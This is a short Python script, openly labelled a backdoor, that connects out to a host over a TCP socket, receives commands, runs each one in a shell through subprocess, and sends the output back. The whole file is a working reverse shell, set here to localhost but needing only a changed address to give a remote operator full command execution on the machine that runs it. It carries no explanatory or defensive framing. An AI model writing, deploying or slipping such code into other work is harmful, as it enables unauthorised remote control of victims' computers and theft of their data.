import socket
import subprocess

host = "127.0.0.1"
port = 22

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(str.encode("Backdoor Running..."))

while True:
    data = s.recv(2024)
    proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

    stdout = proc.stdout.read()
    stderr = proc.stderr.read()
    s.send(stdout)
    s.send(stderr)
    print(stdout)
    print(stderr)
